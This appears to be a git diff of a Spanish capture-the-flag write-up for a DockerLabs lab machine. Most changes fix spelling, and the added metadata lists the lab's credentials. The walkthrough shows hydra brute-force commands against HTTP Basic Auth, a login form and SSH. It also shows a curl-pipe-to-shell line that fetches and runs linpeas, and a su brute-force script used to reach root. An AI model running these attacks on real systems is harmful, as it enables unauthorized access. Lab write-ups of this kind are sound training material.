@@ -2,14 +2,44 @@
 Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
-Dificultad: Facil+
+Dificultad: Fácil+
 VectorInicial: Basic Auth Default Credentials → Login Bruteforce → SSH
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - httpadmin: fhttpadmin
+ - admin: chocolate
+ - balutin: estrella
+ - root: rockyou
+Usuarios:
+ - httpadmin
+ - admin
+ - balutin
+ - root
 Privesc: Password reuse + su brute force
+Tecnicas:
+ - Service Enumeration
+ - Basic Authentication Abuse
+ - Directory Enumeration
+ - Login Bruteforce
+ - SSH Access
+ - Local Enumeration
+ - Credential Discovery
+ - su Brute Force
+ - Privilege Escalation
+Herramientas:
+ - gomap
+ - hydra
+ - gobuster
+ - Burp Suite
+ - linpeas
+ - ssh
+ - scp
 Fecha: 2026-02-26
 ---
 <img width="917" height="574" alt="Pasted image 20260226125648" src="https://github.com/user-attachments/assets/3355593f-be13-4f64-b174-e8389a961e5f" />
 
-Comenzaremos por realizar un escaneo a la maquina para ver los vectores de entrada.
+Comenzaremos realizando un escaneo a la máquina para ver los vectores de entrada.
 
 ```bash
  settarget 172.17.0.2                                              
@@ -40,11 +70,11 @@ Tenemos 2 puertos abiertos:
 - 22 para conexión SSH que puede servirnos para un futuro.
 - 80 para conexión HTTP donde estará alojada una web.
 
-Empezaremos visitando la web para ver que tenemos.
+Empezaremos visitando la web para ver qué tenemos.
 
-Nos encontramos con una solicitud de usuario y contraseña, lo que nos indica que estamos ante un Basic Authentification.
+Nos encontramos con una solicitud de usuario y contraseña, lo que nos indica que estamos ante un **Basic Authentication**.
 
-Llegado a este punto tenemos varias opciones, la primera buscar un exploit que nos permita agilizar el trabajo: [Basic Auth](https://github.com/NexusFireMan/Exploits/tree/main/Basic-Auth-Lab)
+Llegado a este punto tenemos varias opciones. La primera es buscar un exploit que nos permita agilizar el trabajo: [Basic Auth](https://github.com/NexusFireMan/Exploits/tree/main/Basic-Auth-Lab)
 
 ```bash
  python3 basic_auth_tester.py http://$TARGET -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
@@ -60,9 +90,9 @@ Llegado a este punto tenemos varias opciones, la primera buscar un exploit que n
 [!] HTTP status: 200
 ```
 
-Gracias a este este script ya tenemos los credenciales iniciales.
+Gracias a este script ya tenemos las credenciales iniciales.
 
-Pero también podemos usar **Hydra** para descubrir el usuario.
+Pero también podemos usar **Hydra** para descubrir la combinación válida.
 
 ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://$TARGET
@@ -77,9 +107,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 15:22:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 15:22:38
 ```
 
-En cualquiera de los 2 casos ya tenemos las credenciales para ver que hay dentro del servidor.
+En cualquiera de los dos casos ya tenemos las credenciales para ver qué hay dentro del servidor.
 
-Y nos encontramos con la pagina por defecto de Apache y nada mas, nos toca realizar una enumeración de archivos y directorios.
+Y nos encontramos con la página por defecto de Apache y nada más, así que nos toca realizar una enumeración de archivos y directorios.
 
 ```bash
  gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,bak -U httpadmin -P fhttpadmin
@@ -108,35 +138,35 @@ Finished
 ===============================================================
 ```
 
-Como este servidor tiene Basi Auth necesitamos indicar a Gobuster el usuario y la contraseña con los parámetros **-U** y **-P** respectivamente.
+Como este servidor tiene **Basic Auth**, necesitamos indicar a Gobuster el usuario y la contraseña con los parámetros `-U` y `-P`, respectivamente.
 
-Observamos que hay un fichero llamado *login.php* así que vamos a ver que nos encontramos en el.
+Observamos que hay un fichero llamado `login.php`, así que vamos a ver qué nos encontramos en él.
 
 <img width="442" height="715" alt="Pasted image 20260226154316" src="https://github.com/user-attachments/assets/6d8483db-4c21-4154-a58b-bc15065f72d5" />
 
 Nos encontramos con este panel de inicio de sesión bastante curioso.
 
-Ahora es el paso de entrar en *Burp Suit* para capturar las peticiones y ver como podemos continuar.
+Ahora toca entrar en **Burp Suite** para capturar las peticiones y ver cómo podemos continuar.
 
-Lo primero sera fijar el Tarjet para que solo capture las peticiones de este servidor.
+Lo primero será fijar el *target* para que solo capture las peticiones de este servidor.
 
 <img width="908" height="623" alt="Pasted image 20260226160725" src="https://github.com/user-attachments/assets/f6457bfc-6e65-42e4-a96b-f22583b25042" />
 
-Ahora capturamos las peticiones de la pagina para ver como solicita el ingreso, las cabeceras y lo que ocurre si ingresamos un usuario erróneo.
+Ahora capturamos las peticiones de la página para ver cómo solicita el acceso, las cabeceras y lo que ocurre si introducimos un usuario erróneo.
 
 <img width="1439" height="944" alt="Pasted image 20260226160826" src="https://github.com/user-attachments/assets/9e333564-2f72-47f7-a0fe-5e9b21a644ba" />
 
-Como podemos ver la petición se hace con el método **POST**, en la cabecera se añade **Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=**, los datos de inicio de sesión se pasan de manera muy clara **username=admin&password=admin** y al no ser correctos los datos nos indica el texto **Credenciales incorrectas.**.
+Como podemos ver, la petición se hace con el método **POST**. En la cabecera se añade `Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=`, los datos de inicio de sesión se pasan de forma muy clara como `username=admin&password=admin` y, al no ser correctos, la aplicación devuelve el texto **Credenciales incorrectas.**.
 
 Una vez recopilados estos datos podemos intentar un descubrimiento de credenciales mediante diccionario.
 
-Como la lista de *rockyou.txt* es extremadamente grande la reduje a 300 a ver si iba mas rápido.
+Como la lista de `rockyou.txt` es extremadamente grande, la reduje a 300 entradas para ver si iba más rápido.
 
 ```bash
 head -n 300 rockyou.txt > 300-rockyou.txt
 ```
 
-Ahora le lanzamos el ataque para encontrar las credenciales.
+Ahora lanzamos el ataque para encontrar las credenciales.
 
 ```bash
  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/300-rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas." 
@@ -152,11 +182,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 16:25:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 16:26:29
 ```
 
-Bien, con estos credenciales vamos a por el siguiente paso.
+Bien, con estas credenciales vamos a por el siguiente paso.
 
 <img width="351" height="115" alt="Pasted image 20260226162857" src="https://github.com/user-attachments/assets/4eda3f2d-8250-41f0-b3fe-33f222e528a1" />
 
-Después de iniciar sesión vemos este mensaje del usuario **balutin** y dicho esto, vamos por el *SSH* a ver si tenemos suerte.
+Después de iniciar sesión vemos este mensaje del usuario **balutin** y, dicho esto, vamos a probar suerte por **SSH**.
 
 ```bash
  hydra -l balutin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
@@ -171,7 +201,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 16:31:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 16:32:14
 ```
 
-Bien ahora que ya tenemos acceso por *ssh* a ver que nos encontramos en el servidor.
+Bien, ahora que ya tenemos acceso por `ssh`, veamos qué nos encontramos en el servidor.
 
 ```bash
 balutin@4cf1f32d9e59:~$ sudo -l                                                                                                                            
@@ -190,7 +220,7 @@ balutin@4cf1f32d9e59:~$ find / -perm -4000 2>/dev/null
 /usr/bin/chfn
 ```
 
-Por desgracia no tenemos una escalada de privilegios a simple vista, tendremos que buscar otros métodos, san google es tu amigo o chatgpt, todo depende del gusto.
+Por desgracia no tenemos una escalada de privilegios a simple vista, así que tendremos que buscar otros métodos. San Google es tu amigo o ChatGPT, según gustos y nivel de herejía.
 
 También recordé la herramienta de [*linpeas*](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 
@@ -198,7 +228,7 @@ También recordé la herramienta de [*linpeas*](https://github.com/peass-ng/PEAS
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
-Pero este servidor no tiene *curl* y tampoco lo podemos instalar, así que tendremos que descargarlo en nuestra maquina y después subirlo.
+Pero este servidor no tiene `curl` y tampoco lo podemos instalar, así que tendremos que descargarlo en nuestra máquina y después subirlo.
 
 ```bash
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
@@ -208,7 +238,7 @@ Pero este servidor no tiene *curl* y tampoco lo podemos instalar, así que tendr
  scp linpeas.sh balutin@$TARGET:/tmp/
 ```
 
-Ahora volvemos a conectar con la maquina y vemos que información nos arroja *linpeas*.
+Ahora volvemos a conectar con la máquina y vemos qué información nos arroja **linpeas**.
 
 ```bash
 <skip>
@@ -224,7 +254,7 @@ admin|chocolate
 <skip>
 ```
 
-Bueno parece que *linpeas* si ha encontrado algo, así que vamos a probarlo.
+Bueno, parece que **linpeas** sí ha encontrado algo, así que vamos a probarlo.
 
 ```bash
 balutin@4cf1f32d9e59:/tmp$ su admin                                                                                                                        
@@ -239,7 +269,7 @@ Pero nada, toca seguir buscando a ver si encontramos algo.
 
 Encontré un script que es posible que nos sirva de algo [suBruteForce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)
 
-Así que volvemos a lo de antes, descargar y subir.
+Así que volvemos a lo de antes: descargar y subir.
 
 ``` bash
  curl -L https://raw.githubusercontent.com/D1se0/suBruteforce/refs/heads/main/suBruteforceBash/suBruteforce.sh > suBruteforce.sh
@@ -251,7 +281,7 @@ Así que volvemos a lo de antes, descargar y subir.
  scp /usr/share/wordlists/rockyou.txt balutin@$TARGET:/tmp/
 ```
 
-También tenemos que subir un diccionario para las contraseñas, así que hemos subido *rockyou.txt*.
+También tenemos que subir un diccionario de contraseñas, así que hemos subido `rockyou.txt`.
 
 ```bash
  ssh balutin@$TARGET                                                                                                            
@@ -293,4 +323,4 @@ root@4cf1f32d9e59:/tmp#
 
 Con esto ya hemos comprometido el laboratorio y lo hemos finalizado.
 
-La verdad que has esta un poco liado el tema de acceder como root pero ha sido interesante el poder usar varias técnicas hasta conseguirlo.
+La verdad es que ha estado un poco liado el tema de acceder como `root`, pero ha sido interesante poder usar varias técnicas hasta conseguirlo.
